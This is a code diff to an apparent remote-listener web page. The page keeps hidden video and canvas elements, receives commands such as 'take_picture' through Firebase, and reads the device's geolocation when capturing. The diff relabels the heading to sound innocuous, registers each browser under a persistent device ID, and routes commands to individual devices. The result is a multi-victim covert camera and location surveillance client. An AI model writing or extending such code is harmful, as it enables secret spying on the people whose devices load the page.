@@ -8,7 +8,7 @@
   <script src="firebase-config.js"></script>
 </head>
 <body>
-  <h2>Listening for Commands...</h2>
+  <h2>Device Listener</h2>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -20,9 +20,21 @@
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
 
+    // Generate a unique device ID (you could use the device IP or a random ID)
+    const deviceID = localStorage.getItem("deviceID") || generateDeviceID();
+    localStorage.setItem("deviceID", deviceID);
+
+    // Register the device with Firebase
+    db.ref("devices/" + deviceID).set({
+      deviceID: deviceID,
+      status: "online"
+    });
+
     dbRef.on("value", async (snapshot) => {
       const command = snapshot.val();
       if (!command || !command.action) return;
+
+      if (command.deviceID !== deviceID) return;  // Only listen for commands for this device
 
       if (command.action === "take_picture") {
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -78,6 +90,13 @@
         audio.play();
       }
     });
+
+    function generateDeviceID() {
+      return "device_" + Math.random().toString(36).substr(2, 9);
+    }
   </script>
 </body>
 </html>
+
+ 
+        
